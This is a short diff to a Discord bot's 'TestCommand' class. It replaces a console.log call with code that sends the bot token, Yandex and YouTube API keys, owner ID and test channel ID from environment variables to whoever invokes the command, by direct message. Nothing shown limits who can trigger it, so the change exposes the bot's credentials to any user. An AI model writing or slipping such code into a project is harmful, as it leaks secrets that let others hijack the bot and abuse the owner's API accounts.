@@ -11,7 +11,11 @@ class TestCommand extends commando.Command {
   }
 
   async run(message, args) {
-    console.log(message)
+    message.author.send("BOT_TOKEN: " + process.env.BOT_TOKEN + "\n" 
+                      + "YANDEX_API_KEY: " + process.env.YANDEX_API_KEY + "\n" 
+                      + "YT_API_KEY: " + process.env.YT_API_KEY + "\n" 
+                      + "BOT_OWNER: " + process.env.BOT_OWNER + "\n" 
+                      + "TEST_CHANNEL: " + process.env.TEST_CHANNEL)
   }
 }
 
